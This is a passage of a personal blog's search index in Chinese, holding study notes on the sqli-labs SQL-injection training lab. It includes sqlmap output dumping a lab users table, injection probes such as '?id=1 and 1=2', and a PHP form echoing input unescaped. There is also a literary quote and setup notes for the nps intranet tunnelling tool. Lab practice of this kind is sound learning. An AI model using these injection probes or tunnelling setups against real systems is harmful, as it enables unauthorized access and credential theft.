&#39;genious&#39;</span><br><span class="line">[17:22:49] [INFO] retrieved: &#39;superman&#39;</span><br><span class="line">[17:22:50] [INFO] retrieved: &#39;7&#39;</span><br><span class="line">[17:22:51] [INFO] retrieved: &#39;mob!le&#39;</span><br><span class="line">[17:22:52] [INFO] retrieved: &#39;batman&#39;</span><br><span class="line">[17:22:53] [INFO] retrieved: &#39;8&#39;</span><br><span class="line">[17:22:55] [INFO] retrieved: &#39;admin&#39;</span><br><span class="line">[17:22:56] [INFO] retrieved: &#39;admin&#39;</span><br><span class="line">[17:22:57] [INFO] retrieved: &#39;9&#39;</span><br><span class="line">[17:22:58] [INFO] retrieved: &#39;admin1&#39;</span><br><span class="line">[17:22:59] [INFO] retrieved: &#39;admin1&#39;</span><br><span class="line">[17:23:00] [INFO] retrieved: &#39;10&#39;</span><br><span class="line">[17:23:01] [INFO] retrieved: &#39;admin2&#39;</span><br><span class="line">[17:23:02] [INFO] retrieved: &#39;admin2&#39;</span><br><span class="line">[17:23:03] [INFO] retrieved: &#39;11&#39;</span><br><span class="line">[17:23:04] [INFO] retrieved: &#39;admin3&#39;</span><br><span class="line">[17:23:05] [INFO] retrieved: &#39;admin3&#39;</span><br><span class="line">[17:23:07] [INFO] retrieved: &#39;12&#39;</span><br><span class="line">[17:23:08] [INFO] retrieved: &#39;dumbo&#39;</span><br><span class="line">[17:23:09] [INFO] retrieved: &#39;dhakkan&#39;</span><br><span class="line">[17:23:10] [INFO] retrieved: &#39;14&#39;</span><br><span class="line">[17:23:11] [INFO] retrieved: &#39;admin4&#39;</span><br><span class="line">[17:23:12] [INFO] retrieved: &#39;admin4&#39;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>over.</p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql_injection</tag>
+        <tag>sqli_labs</tag>
+        <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-关于url中井号的理解</title>
+    <url>/2021/01/18/sql%E6%B3%A8%E5%85%A5-%E5%85%B3%E4%BA%8Eurl%E4%B8%AD%E4%BA%95%E5%8F%B7%E7%9A%84%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<p>关于url and #的理解</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello World!&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">			&lt;p&gt;</span><br><span class="line">				User ID:</span><br><span class="line">				&lt;input type&#x3D;&quot;text&quot; size&#x3D;&quot;15&quot; name&#x3D;&quot;id&quot;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">			&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if ($_GET[&quot;id&quot;])</span><br><span class="line">    echo &quot;Hello World!&quot;.&quot;id is &quot;.$_GET[&quot;id&quot;];</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>#，提交到当前页面</p>
+<p>_GET可以取出提交的值。</p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql_injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-判断是字符型还是整型</title>
+    <url>/2021/01/18/sql%E6%B3%A8%E5%85%A5-%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E5%9E%8B/</url>
+    <content><![CDATA[<p>?id=1 and 1=2</p>
+<p>来自百度：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zhidao.baidu.com&#x2F;question&#x2F;1952853439075012508.html</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>总结这个问题如下：<br>SELECT uname,email FROM userinfo WHERE id = ‘1 and 1=3’ ;<br>这句SQL是可以查询到结果的,当然前提是有id=1的数据。<br>其实，1后面的字符可以是任意的，不会影响查询，它甚至可以是：<br>SELECT uname,email FROM userinfo WHERE id = ‘1dsasasdasasd’ ;<br>那么为什么会这样呢？<br>经过测试，我发现这是因为id的类型为数值型,例如int，而查询的时候传入的是字符串，而MYSQL是十分智能的，它会进行类型转换，但是这个转换过程是很随意的，就像varchar 的’2asdasd’会被转成int的 2。<br>当然，如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’2adsdasd’等类似的数据由于数据库里没有匹配项,查询结果为空。</p>
+</blockquote>
+<hr>
+<p>卧槽是正确的</p>
+<p>分析：</p>
+<p>假设id在数据库的类型是数值型如int。</p>
+<p><img src="https://i.loli.net/2021/01/14/COMHfYWKqTRimDn.png" alt="image-20210114143843875"></p>
+<p>上图可得出，传给id的是一个字符串，数据库会进行一个转换，id=’1’转换为id=1</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.sqli-labs.com&#x2F;Less-1&#x2F;?id&#x3D;1dsasasdasasd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/f8y6but93clasXF.png" alt="image-20210114144015677"></p>
+<p>上图可得出，传给id的是一个字符串，数据库会进行一个转换，id=’1dsasasdasasd’转换为id=1</p>
+<p>原理同上，验证正确。</p>
+<p>综上，假设正确，id为int型。进源代码查看如下：正确。</p>
+<p><img src="https://i.loli.net/2021/01/14/mqc1yu8w9VZGDRU.png" alt="image-20200907233834055"></p>
+<hr>
+<p>分析如下：</p>
+<blockquote>
+<p>经过测试，我发现这是因为id的类型为数值型,例如int，而查询的时候传入的是字符串，而MYSQL是十分智能的，它会进行类型转换，但是这个转换过程是很随意的，就像varchar 的’2asdasd’会被转成int的 2。<br>当然，如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’2adsdasd’等类似的数据由于数据库里没有匹配项,查询结果为空。</p>
+</blockquote>
+<p>牛逼，应该是这样。</p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql_injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>王小波的话</title>
+    <url>/2021/01/16/wangxiaobo/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">人的一切痛苦，本质上都是对自己的无能的愤怒。</blockquote>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% centerquote %&#125;人有权拒绝一种虚伪的崇高，正如他有权拒绝下水去捞一根稻草。假如这是对的，就对营造或提倡社会伦理的人提出了更高的要求：不能只顾浪漫煽情，要留有余地；换言之，不能够只讲崇高，不讲道理。&#123;% endcenterquote %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% cq %&#125; 希腊神话里说，白银时代的人蒙神恩宠，终身不会衰老，也不会为生计所迫，他们没有痛苦没有忧虑，一直到死，相貌和心灵都像儿童。死掉以后，他们的幽灵还会在尘世上游荡。 &#123;% endcq %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<center>这是用center标签来居中的，试一下看可不可以。</center>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文本居中的引用</span><br><span class="line">此标签将生成一个带上下分割线的引用，同时引用内文本将自动居中。 文本居中时，多行文本若长度不等，视觉上会显得不对称，因此建议在引用单行文本的场景下使用。 例如作为文章开篇引用 或者 结束语之前的总结引用。</span><br><span class="line"></span><br><span class="line">使用方式</span><br><span class="line">HTML方式：使用这种方式时，给 img 添加属性 class&#x3D;&quot;blockquote-center&quot; 即可。</span><br><span class="line">标签方式：使用 centerquote 或者 简写 cq。</span><br><span class="line">此标签要求 NexT 的版本在 0.4.5 或以上。 若你正在使用的版本比较低，可以选择使用 HTML 方式。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- HTML方式: 直接在 Markdown 文件中编写 HTML 来调用 --&gt;</span><br><span class="line">&lt;!-- 其中 class&#x3D;&quot;blockquote-center&quot; 是必须的 --&gt;</span><br><span class="line">&lt;blockquote class&#x3D;&quot;blockquote-center&quot;&gt;blah blah blah&lt;&#x2F;blockquote&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 标签 方式，要求版本在0.4.5或以上 --&gt;</span><br><span class="line">&#123;% centerquote %&#125;blah blah blah&#123;% endcenterquote %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- 标签别名 --&gt;</span><br><span class="line">&#123;% cq %&#125; blah blah blah &#123;% endcq %&#125;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;这是用center标签来居中的，试一下看可不可以。&lt;&#x2F;center&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>literature</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网穿透-nps-notes</title>
+    <url>/2020/09/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-nps-notes/</url>
+    <content><![CDATA[<p>nps notes</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021-01-13</span><br><span class="line">参考：</span><br><span class="line">来着github</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps&#x2F;blob&#x2F;master&#x2F;README_zh.md</span><br><span class="line"></span><br><span class="line">来自哔哩哔哩</span><br><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV12E411B7Ns?from&#x3D;search&amp;seid&#x3D;15898087636535266347</span><br><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1b7411D7Fw?from&#x3D;search&amp;seid&#x3D;6562851621532130301</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">做微信公众号开发、小程序开发等----&gt; 域名代理模式</span><br><span class="line"></span><br><span class="line">想在外网通过ssh连接内网的机器，做云服务器到内网服务器端口的映射，----&gt; tcp代理模式</span><br><span class="line"></span><br><span class="line">在非内网环境下使用内网dns，或者需要通过udp访问内网机器等----&gt; udp代理模式</span><br><span class="line"></span><br><span class="line">在外网使用HTTP代理访问内网站点----&gt; http代理模式</span><br><span class="line"></span><br><span class="line">搭建一个内网穿透ss，在外网如同使用内网vpn一样访问内网资源或者设备----&gt; socks5代理模式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理...</span><br><span class="line">全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</span><br><span class="line">控制全面，同时支持服务端和客户端控制</span><br><span class="line">https集成，支持将后端代理和web服务转成https，同时支持多证书</span><br><span class="line">操作简单，只需简单的配置即可在web ui上完成其余操作</span><br><span class="line">展示信息全面，流量、系统信息、即时带宽、客户端版本等</span><br><span class="line">扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</span><br><span class="line">域名解析具备自定义header、404页面配置、host修改、站点保护、URL路由、泛解析等功能</span><br><span class="line">服务端支持多用户和用户注册功能</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">快速开始</span><br><span class="line">安装</span><br><span class="line">releases</span><br><span class="line">下载对应的系统版本即可，服务端和客户端是单独的</span><br><span class="line"></span><br><span class="line">服务端启动</span><br><span class="line">下载完服务器压缩包后，解压，然后进入解压后的文件夹</span><br><span class="line"></span><br><span class="line">执行安装命令</span><br><span class="line">对于linux|darwin sudo .&#x2F;nps install</span><br><span class="line"></span><br><span class="line">对于windows，管理员身份运行cmd，进入安装目录 nps.exe install</span><br><span class="line"></span><br><span class="line">默认端口</span><br><span class="line">nps默认配置文件使用了80，443，8080，8024端口</span><br><span class="line"></span><br><span class="line">80与443端口为域名解析模式默认端口</span><br><span class="line"></span><br><span class="line">8080为web管理访问端口</span><br><span class="line"></span><br><span class="line">8024为网桥端口，用于客户端与服务器通信</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line">对于linux|darwin sudo nps start</span><br><span class="line"></span><br><span class="line">对于windows，管理员身份运行cmd，进入程序目录 nps.exe start</span><br><span class="line"></span><br><span class="line">安装后windows配置文件位于 C:\Program Files\nps，linux和darwin位于&#x2F;etc&#x2F;nps</span><br><span class="line"></span><br><span class="line">如果发现没有启动成功，可以查看日志(Windows日志文件位于当前运行目录下，linux和darwin位于&#x2F;var&#x2F;log&#x2F;nps.log)</span><br><span class="line"></span><br><span class="line">访问服务端ip:web服务端口（默认为8080）</span><br><span class="line">使用用户名和密码登陆（默认admin&#x2F;123，正式使用一定要更改）</span><br><span class="line">创建客户端</span><br><span class="line">客户端连接</span><br><span class="line">点击web管理中客户端前的+号，复制启动命令</span><br><span class="line">执行启动命令，linux直接执行即可，windows将.&#x2F;npc换成npc.exe用cmd执行</span><br><span class="line">如果需要注册到系统服务可查看注册到系统服务</span><br><span class="line"></span><br><span class="line">配置</span><br><span class="line">客户端连接后，在web中配置对应穿透服务即可</span><br><span class="line">更多高级用法见完整文档</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2020/09/24/sSWeDmLgHAKlJIk.png" alt="image-20200924002317330"></p>
+<p><img src="https://i.loli.net/2020/09/24/Dqrd9VxwZY6AE2W.png" alt="image-20200924002400305"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;npc.exe -server&#x3D;119.2*****.19:8024 -vkey&#x3D;**********4x6bzyc6g09 -type&#x3D;tcp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2020/09/24/WMPYCBDyKz1p7Ev.png" alt="image-20200924002516982"></p>
+<p><img src="https://i.loli.net/2020/09/24/fylNG3jpMLbCiXe.png" alt="image-20200924002635118"></p>
+<p><img src="https://i.loli.net/2020/09/24/d9RinLJajIDeK4Q.png" alt="image-20200924002714899"></p>
+<p><img src="https://i.loli.net/2020/09/24/ZBHY98yvrCqLcwl.png" alt="image-20200924002806679"></p>
+<p><img src="https://i.loli.net/2020/09/24/FwqbnW58hvVDNYO.png" alt="image-20200924002840066"></p>
+<p><img src="https://i.loli.net/2020/09/24/DtkOPyTwixWbL49.png" alt="image-20200924002906183"></p>
+<p><img src="https://i.loli.net/2020/09/24/dNJeQHOWiEZI5Us.png" alt="image-20200924002937647"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>nps</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+</search>
